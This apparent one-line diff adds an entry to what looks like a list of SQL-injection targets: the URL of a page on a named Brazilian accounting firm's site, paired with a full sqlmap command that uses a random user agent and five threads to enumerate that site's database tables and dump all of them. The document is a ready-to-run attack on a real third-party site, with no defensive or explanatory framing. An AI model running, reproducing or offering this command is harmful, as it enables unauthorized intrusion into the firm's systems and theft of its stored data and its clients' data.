@@ -1,0 +1,1 @@
+http://www.gecontabilidade.com.br/maisnot.php?id=4 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://www.gecontabilidade.com.br/maisnot.php?id=4 -D gecontabilidad --tables --dump-all
